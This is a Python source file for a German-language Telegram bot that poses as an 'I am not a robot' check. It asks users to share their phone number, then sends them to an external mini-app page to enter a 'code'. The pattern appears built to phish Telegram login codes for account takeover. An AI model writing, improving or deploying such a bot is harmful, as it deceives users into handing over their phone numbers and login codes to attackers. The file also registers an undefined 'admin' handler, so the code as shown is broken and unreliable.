import os
import logging
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from dotenv import load_dotenv

load_dotenv()
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
MINI_APP_URL = os.getenv("MINI_APP_URL", "https://deine-render-url.onrender.com/verify")
GIF_URL = os.getenv("GIF_URL", "")

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[KeyboardButton("Ich Bin Kein Roboter", request_contact=True)]]
    reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
    text = "✅ Drücke hier um dich zu verifizieren"
    
    if GIF_URL:
        await update.message.reply_animation(animation=GIF_URL, caption=text, reply_markup=reply_markup)
    else:
        await update.message.reply_text(text, reply_markup=reply_markup)

async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    if contact and contact.user_id == update.effective_user.id:
        phone = contact.phone_number
        if not phone.startswith("+"):
            phone = "+" + phone
        url = f"{MINI_APP_URL}?phone={phone}&auto=1"
        keyboard = [[InlineKeyboardButton("Code eingeben", web_app=WebAppInfo(url=url))]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "🔐 Code wurde gesendet. Gib ihn jetzt ein:",
            reply_markup=reply_markup
        )
        await update.message.reply_text(" ", reply_markup=ReplyKeyboardRemove())
    else:
        await update.message.reply_text("❌ Bitte teile deine eigene Nummer.")

async def main():
    if not BOT_TOKEN:
        print("❌ BOT_TOKEN fehlt")
        return
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admin", admin))
    app.add_handler(MessageHandler(filters.CONTACT, contact_handler))
    print("Bot startet...")
    print(f"Mini-App URL: {MINI_APP_URL}")
    if GIF_URL:
        print(f"GIF: {GIF_URL}")
    await app.initialize()
    await app.start()
    await app.updater.start_polling(allowed_updates=Update.ALL_TYPES)
    print("Bot läuft. Warte auf Nachrichten...")
    while True:
        await asyncio.sleep(3600)

if __name__ == "__main__":
    asyncio.run(main())
